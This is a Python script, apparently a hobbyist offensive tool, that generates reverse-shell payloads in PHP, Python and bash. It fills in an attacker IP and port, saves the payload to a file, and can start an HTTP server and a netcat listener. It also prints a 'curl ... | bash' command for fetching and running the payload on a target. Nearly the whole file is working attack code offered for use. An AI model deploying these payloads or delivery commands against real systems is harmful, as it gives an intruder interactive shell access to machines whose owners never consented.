#!/usr/bin/env python3

import netifaces as ni
from os import system as cmd

banner = """
 ____  _          _ _                                   _             
/ ___|| |__   ___| | |   __ _  ___ _ __   ___ _ __ __ _| |_ ___  _ __ 
\___ \| '_ \ / _ \ | |  / _` |/ _ \ '_ \ / _ \ '__/ _` | __/ _ \| '__|
 ___) | | | |  __/ | | | (_| |  __/ | | |  __/ | | (_| | || (_) | |   
|____/|_| |_|\___|_|_|  \__, |\___|_| |_|\___|_|  \__,_|\__\___/|_|   
                        |___/                                         
           by @behiNdysec
   (Only 4 Linux)
"""
print(banner)
exit_message = "\n\n[💀] Hack The World!"

shells = {
	"php": {
	"code": """<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = 'IP_VALUE';
$port = PORT_VALUE;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}
	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}
?>""",
	"extension": "php"
	},

	"python": {
	"code": """#!/usr/bin/env python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("IP_VALUE",PORT_VALUE))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])""",
	"extension": "py"
	},

	"bash": {
	"code": """#!/bin/bash
bash -i >& /dev/tcp/IP_VALUE/PORT_VALUE 0>&1""",
	"extension": "sh"
	}
}

ip_addresses = {}
for iface in ["eth0", "tap0", "tun0", "wlan0"]:
	try:
		ip = ni.ifaddresses(f'{iface}')[ni.AF_INET][0]['addr']
		ip_addresses[iface] = ip
	except:
		pass

def initial():
	"""Asks user for IP, port and shell type"""
	global attacker_port, attacker_ip, shell_type
	try:
		use_ip = input(f"[~] Detected IP addresses: {ip_addresses}.\n[+] Please type the iface name (e.g. tap0), otherwise press enter for a custom IP: ")
		if use_ip in ip_addresses.keys():
			attacker_ip = ip_addresses[use_ip]
		elif use_ip == "":
			attacker_ip = input("[+] Attacker IP: ")
		else:
			print("[!] Could not find this interface. Returning.\n")
			return initial()
		
		attacker_port = input("[+] Attacker port: ")

		# Validating IP and PORT
		if not is_valid():
			print("[!] You did something wrong. Returning.\n")
			return initial()

		shell_type = input("[+] Shell type (python/bash/php): ")
		
		# Generating shell
		shell_gen()

	except KeyboardInterrupt:
		return print(exit_message)
	except ValueError:
		print("[!] Invalid port! Returning.\n")
		return initial()

def is_valid():
	"""Validates IP and PORT values, returning a boolean"""
	dot_count = attacker_ip.count(".")
	try:
		if dot_count != 3 or len(attacker_ip) > 15 or int(attacker_port) > 65534:
			return False
		else:
			return True
	except ValueError:
		return False

def shell_gen():
	"""Shell generation process"""
	if shell_type not in shells.keys():
		print("[!] Invalid shell type! Returning.\n")
		return initial()

	shell = shells[shell_type]["code"].split("\n")
	extension = shells[shell_type]["extension"]
	global shell_name
	shell_name = f"shell.{extension}"

	# Taking note of IP and PORT values index on the shell
	for i in range(len(shell)):
		if "IP_VALUE" in shell[i]:
			ip_line = i
		
		if "PORT_VALUE" in shell[i]:
			port_line = i

	shell[ip_line] = shell[ip_line].replace("IP_VALUE", attacker_ip)
	shell[port_line] = shell[port_line].replace("PORT_VALUE", attacker_port)

	with open(f'{shell_name}', 'a') as file:
		for line in shell:
			file.write(f"{line}\n")

	print(f"[pwn] Success! Shell has been generated and saved to file '{shell_name}'!")

	# Post acts?
	post()

def post():
	"""Post acts like running http server or netcat"""
	try:
		init = input("\n[server] Fire up a python http server (port 80)\n[netcat] Fire up netcat (same shell port)\n[~] Type server/netcat or server,netcat if both: ")
		
		server_message = f"\n[~] Common commands: wget http://{attacker_ip}/{shell_name} || curl http://{attacker_ip}/{shell_name} | bash (if it's a bash shell)"
		command = "echo '[+] Starting...'"
		commands = {
		"server": f" & python3 -m http.server 80",
		"netcat": f" & nc -lvnp {attacker_port}"
		}

		for i in init.split(","):
			if i in commands.keys():
				command += commands[i]
			else:
				print(f"[!] '{i}' is invalid! Returning.")
				return post()
		if "python" in command:
			print(server_message)
		cmd(command)
	except ValueError:
		raise KeyboardInterrupt

initial()
